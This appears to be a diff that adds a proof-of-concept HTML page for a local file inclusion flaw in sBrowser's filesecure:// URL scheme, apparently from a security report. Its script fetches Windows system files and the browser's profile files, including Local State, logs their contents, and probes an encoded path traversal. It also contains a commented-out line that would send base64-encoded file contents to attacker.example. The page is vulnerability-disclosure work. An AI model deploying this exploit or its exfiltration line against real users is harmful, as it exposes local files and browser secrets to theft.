@@ -1,0 +1,37 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>F-01 PoC filesecure LFI</title></head><body>
+<h1>sBrowser filesecure:// LFI PoC (F-01)</h1>
+<pre id="out">loading...</pre>
+<script>
+(async()=>{
+  const out = document.getElementById('out');
+  const log = (m)=>{ out.textContent += '\n'+m; console.log(m); };
+  const files = [
+    'filesecure://x/C:/Windows/win.ini',
+    'filesecure://x/C:/Windows/System32/drivers/etc/hosts',
+    'filesecure://x/C:/Users/PC/AppData/Roaming/Seznam.cz/Local State',
+    'filesecure://x/C:/Users/PC/AppData/Roaming/Seznam.cz/Sbrowser Storage/windowStore.json',
+    'filesecure://x/C:/Users/PC/AppData/Roaming/Seznam.cz/Sbrowser Storage/settingsStore.json',
+    'filesecure://x/C:/Users/PC/AppData/Roaming/Seznam.cz/Sbrowser Storage/phishingStore.json',
+  ];
+  for(const u of files){
+    try{
+      const r = await fetch(u);
+      const t = await r.text();
+      log(`[OK] ${u} status=${r.status} len=${t.length}`);
+      log(t.slice(0,800));
+      // exfil simulation: send preview to attacker (here we just log)
+      // await fetch('https://attacker.example/exfil?d='+encodeURIComponent(btoa(t.slice(0,2000))));
+    }catch(e){
+      log(`[ERR] ${u} ${e}`);
+    }
+  }
+  // encoded traversal should 404
+  try{
+    const r = await fetch('filesecure://x/C:/%2e%2e/%2e%2e/Windows/win.ini');
+    log(`[encoded] status=${r.status} ok=${r.ok} (expected 404)`);
+  }catch(e){ log(`[encoded err] ${e}`); }
+  log('\nDone — if you see hosts/win.ini/Local State above, F-01 is verified.');
+})();
+</script>
+</body></html>
